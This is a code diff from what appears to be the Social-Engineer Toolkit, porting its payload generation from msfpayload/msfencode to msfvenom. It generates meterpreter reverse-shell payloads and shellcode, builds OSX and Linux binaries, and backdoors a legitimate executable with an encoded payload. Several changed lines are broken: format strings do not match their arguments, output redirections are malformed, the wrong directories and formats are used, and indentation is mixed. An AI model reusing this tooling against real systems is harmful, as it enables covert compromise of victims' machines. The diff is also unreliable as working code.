@@ -134,7 +134,7 @@ if check_options("IPADDR=") == False:
 
         except Exception,e:
             log(e)
-            ipaddr=raw_input(setprompt(["4"], "IP address for the payload listener"))
+            ipaddr=raw_input(setprompt(["4"], "IP address for the payload listener (LHOST)"))
             update_options("IPADDR=" + ipaddr)
 
     # if AUTO_DETECT=OFF prompt for IP Address
@@ -368,10 +368,10 @@ try:
 
         # if encoding is required, it will place 1msf.exe first then encode it to msf.exe
         if encoder == "true":
-            choice4=("R")
+            choice4=("raw")
             msf_filename=("1msf.exe")
         if encoder == "false":
-            choice4=("X")
+            choice4=("exe")
             msf_filename=("msf.exe")
 
         # set choice to blank for ALL PORTS scan
@@ -387,7 +387,7 @@ try:
                 if choice1 != "shellcode/alphanum":
                     if choice1 != "shellcode/pyinject":
                         if choice1 != "shellcode/multipyinject":
-                            generatepayload=subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s %s %s %s > %s/%s" % (path,choice1,choice2,portnum,courtesyshell,choice4,setdir,msf_filename), shell=True).wait()
+                            generatepayload=subprocess.Popen(r"ruby %s/msfvenom -p %s LHOST=%s %s --format %s > %s %s" % (path,choice1,choice2,portnum,choice4,setdir,msf_filename), shell=True).wait()
                 # if we are using shellcodeexec
                 if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject":
                     if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject":
@@ -406,15 +406,13 @@ try:
                         # select all ports
                         if choice9 == "4":
                             choice9 = "windows/meterpreter/reverse_tcp_allports"
-
                         if ipaddr == "":
                             # grab ipaddr if not defined
                             ipaddr = check_options("IPADDR=")
 
                     if choice1 == "shellcode/alphanum":
-                        print_status("Generating the payload via msfpayload and generating alphanumeric shellcode...")
-                        subprocess.Popen("ruby %s/msfpayload %s LHOST=%s %s EXITFUNC=thread R > %s/meterpreter.raw" % (path,choice9,choice2,portnum,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
-                        subprocess.Popen("ruby %s/msfencode -e x86/alpha_mixed -i %s/meterpreter.raw -t raw BufferRegister=EAX > %s/meterpreter.alpha_decoded" % (path,setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                        print_status("Generating the payload via msfvenom and generating alphanumeric shellcode...")
+			subprocess.Popen("ruby %s/msfvenom -p %s LHOST=%s %s EXITFUNC=thread -e x86/alpha_mixed --format raw BufferRegister=EAX > %s/meterpreter.alpha_decoded" % (path,choice9,choice2,portnum,setdir), shell=True).wait()
 
                     if choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject":
                         # here we update set options to specify pyinjection and multipy
@@ -662,7 +660,7 @@ try:
                 if backdoor_execution == "on": backdoor_execution = "-k"
                 if backdoor_execution != "on": backdoor_execution = ""
                 subprocess.Popen("cp %s %s/legit.exe 1> /dev/null 2> /dev/null" % (custom_exe,setdir), shell=True).wait()
-                encodepayload=subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s %s %s %s | ruby %s/msfencode  -c 10 -e x86/shikata_ga_nai -x %s/legit.exe -o %s/msf.exe -t exe %s 1> /dev/null 2>/dev/null" % (path,choice1,choice2,portnum,courtesyshell,choice4,path,setdir,setdir,backdoor_execution), shell=True).wait()
+                encodepayload=subprocess.Popen(r"ruby %s/msfvenom -p %s LHOST=%s %s -c 10 -e x86/shikata_ga_nai -x %s/legit.exe --format exe > %s/msf.exe" % (path,choice1,choice2,portnum,path,setdir,setdir), shell=True).wait()
                 print_status("Backdoor completed successfully. Payload is now hidden within a legit executable.")
 
 
@@ -734,9 +732,9 @@ try:
                         osxpayload = check_config("OSX_PAYLOAD_DELIVERY=")
                         linuxpayload = check_config("LINUX_PAYLOAD_DELIVERY=")
                         print_status("Generating OSX payloads through Metasploit...")
-                        subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s LPORT=%s X > %s/mac.bin;chmod 755 %s/mac.bin" % (path,osxpayload,choice2,port1,setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                        subprocess.Popen(r"ruby %s/msfvenom -p %s LHOST=%s LPORT=%s --format elf > %s/mac.bin;chmod 755 %s/mac.bin" % (path,osxpayload,choice2,port1,setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                         print_status("Generating Linux payloads through Metasploit...")
-                        subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s LPORT=%s X > %s/nix.bin" % (path,linuxpayload,choice2,port2,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                        subprocess.Popen(r"ruby %s/msfvenom -p %s LHOST=%s LPORT=%s --format elf > %s/nix.bin" % (path,linuxpayload,choice2,port2,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                         if multiattack_java == "on":
                             multiattack.write("OSX="+str(port1)+"\n")
                             multiattack.write("OSXPAYLOAD=%s\n" % (osxpayload))
